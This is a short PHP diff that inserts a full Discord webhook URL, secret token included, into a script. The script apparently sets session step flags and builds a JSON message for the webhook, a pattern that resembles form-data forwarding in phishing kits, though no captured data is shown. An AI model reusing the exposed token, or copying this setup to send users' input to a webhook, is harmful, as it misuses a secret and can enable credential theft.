@@ -15,7 +15,7 @@ $message = "
 $_SESSION['step_one']  = true;
 
 
-$webhookurl = "";//INSERER LE LIEN DU webhook
+$webhookurl = "https://discord.com/api/webhooks/1224114917611667596/bpQiia7uOwKdWTxJ2bKfB8wTXnE-p2AFWGvpENkhPBdREUjGTV0s3Z3s1WmqnrN1ReWR";//INSERER LE LIEN DU webhook
 $timestamp = date("c", strtotime("now"));
 $json_data = json_encode([
 
